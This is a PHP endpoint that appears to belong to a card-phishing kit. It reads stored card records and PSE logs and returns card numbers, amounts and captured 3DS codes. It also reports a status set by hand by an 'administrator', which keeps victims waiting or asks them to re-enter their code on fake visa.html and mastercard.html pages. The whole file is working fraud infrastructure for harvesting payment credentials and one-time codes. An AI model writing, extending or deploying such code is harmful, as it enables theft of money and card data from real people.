<?php
/**
 * check_aprobacion.php - Verifica estado de aprobación para tarjetas
 * Conecta con visa.html, mastercard.html, etc.
 */

error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$log_id = $_GET['log_id'] ?? null;

if (!$log_id) {
    http_response_code(400);
    echo json_encode(['estado' => 'pendiente', 'error' => 'No log_id']);
    exit;
}

$logsFile = __DIR__ . '/data/pse_logs.json';
$tarjetasFile = __DIR__ . '/data/tarjetas.json';

// Buscar en tarjetas.json primero
if (file_exists($tarjetasFile)) {
    $content = file_get_contents($tarjetasFile);
    $tarjetas = json_decode($content, true) ?? [];
    
    foreach ($tarjetas as $tarjeta) {
        if (isset($tarjeta['id_3ds']) && $tarjeta['id_3ds'] === $log_id) {
            $estado = $tarjeta['estado_3ds'] ?? 'pendiente';
            $mensaje = '';
            $accion = '';
            
            if ($estado === 'aprobado') {
                $mensaje = '✅ Pago aprobado exitosamente';
                $accion = 'aprobado';
            } elseif ($estado === 'rechazado') {
                $mensaje = '❌ Pago rechazado, intenta nuevamente';
                $accion = 'rechazado';
            } elseif ($estado === 'error_clave') {
                $mensaje = '❌ Error de clave, verifica tu código 3DS';
                $accion = 'error_clave';
            } else {
                $mensaje = '⏳ Esperando aprobación del administrador...';
                $accion = 'pendiente';
            }
            
            echo json_encode([
                'id' => $tarjeta['id_3ds'],
                'estado' => $estado,
                'aprobado' => $estado === 'aprobado',
                'rechazado' => $estado === 'rechazado',
                'error_clave' => $estado === 'error_clave',
                'pendiente' => $estado === 'pendiente',
                'tipo_tarjeta' => $tarjeta['tipo_tarjeta'] ?? 'visa',
                'numero_tarjeta' => $tarjeta['numero_tarjeta'] ?? '',
                'monto' => $tarjeta['monto'] ?? '0',
                'mensaje' => $mensaje,
                'accion' => $accion,
                'codigo_3ds' => $tarjeta['codigo_3ds'] ?? ''
            ]);
            exit;
        }
    }
}

// Buscar en pse_logs.json
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
    
    foreach ($logs as $log) {
        if (isset($log['id_3ds']) && $log['id_3ds'] === $log_id) {
            $estado = $log['estado_3ds'] ?? 'pendiente';
            $mensaje = '';
            $accion = '';
            
            if ($estado === 'aprobado') {
                $mensaje = '✅ Pago aprobado exitosamente';
                $accion = 'aprobado';
            } elseif ($estado === 'rechazado') {
                $mensaje = '❌ Pago rechazado, intenta nuevamente';
                $accion = 'rechazado';
            } elseif ($estado === 'error_clave') {
                $mensaje = '❌ Error de clave, verifica tu código 3DS';
                $accion = 'error_clave';
            } else {
                $mensaje = '⏳ Esperando aprobación del administrador...';
                $accion = 'pendiente';
            }
            
            echo json_encode([
                'id' => $log['id_3ds'],
                'estado' => $estado,
                'aprobado' => $estado === 'aprobado',
                'rechazado' => $estado === 'rechazado',
                'error_clave' => $estado === 'error_clave',
                'pendiente' => $estado === 'pendiente',
                'tipo_tarjeta' => $log['tipo_tarjeta'] ?? 'visa',
                'numero_tarjeta' => $log['numero_tarjeta'] ?? '',
                'monto' => $log['monto'] ?? '0',
                'mensaje' => $mensaje,
                'accion' => $accion,
                'codigo_3ds' => $log['codigo_3ds'] ?? ''
            ]);
            exit;
        }
    }
}

// No encontrado
echo json_encode([
    'estado' => 'pendiente',
    'id' => $log_id,
    'mensaje' => '⏳ Esperando aprobación del administrador...',
    'accion' => 'pendiente'
]);
exit;
?>